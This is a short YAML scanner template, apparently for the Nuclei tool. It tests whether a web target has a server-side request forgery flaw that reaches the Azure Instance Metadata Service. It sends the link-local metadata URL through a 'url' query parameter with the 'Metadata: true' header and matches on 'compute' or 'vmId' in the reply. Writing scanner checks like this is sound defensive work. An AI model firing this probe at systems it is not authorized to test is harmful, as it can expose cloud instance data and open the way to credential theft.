id: whai-ssrf-azure-metadata

info:
  name: SSRF to Azure Metadata Service
  author: whitehat-ai
  severity: critical
  description: Tests SSRF reaching Azure IMDS
  tags: ssrf,azure,cloud,critical
  classification:
    cwe-id: CWE-918

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

    headers:
      Metadata: "true"

    matchers:
      - type: word
        part: body
        words:
          - '"compute"'
          - '"vmId"'
        condition: or
